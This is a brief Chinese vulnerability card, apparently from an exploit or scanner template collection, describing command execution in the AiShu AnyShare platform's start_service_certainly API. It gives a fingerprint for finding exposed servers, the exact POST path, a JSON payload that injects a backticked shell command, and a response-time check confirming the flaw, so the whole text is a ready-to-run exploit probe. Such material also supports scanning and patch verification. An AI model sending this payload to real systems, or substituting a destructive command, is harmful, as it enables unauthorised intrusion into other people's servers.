# 爱数AnyShare智能内容管理平台start_service_certainly存在命令执行漏洞

爱数AnyShare智能内容管理平台 ｜ 命令执行 ｜ —
- **指纹**：`body="/res/libs/webuploader/webuploader.css"`
- **请求**：`POST /api/ServiceAgent/start\_service\_certainly HTTP/1.1`

**Payload**
```
\["`sleep 4`",0]
```
- **响应特征**：200 响应时间>=4s